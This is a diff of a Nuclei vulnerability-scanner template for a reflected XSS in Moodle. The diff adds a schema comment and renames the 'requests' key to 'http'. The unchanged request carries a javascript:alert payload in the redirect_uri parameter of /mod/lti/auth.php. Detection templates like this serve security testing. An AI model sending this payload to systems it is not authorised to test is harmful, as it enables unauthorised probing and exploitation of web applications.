@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: moodle-xss
 
 info:
@@ -8,7 +9,7 @@ info:
   tags: moodle,xss
   reference: https://twitter.com/JacksonHHax/status/1391367064154042377
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert('{{randstr}}')"
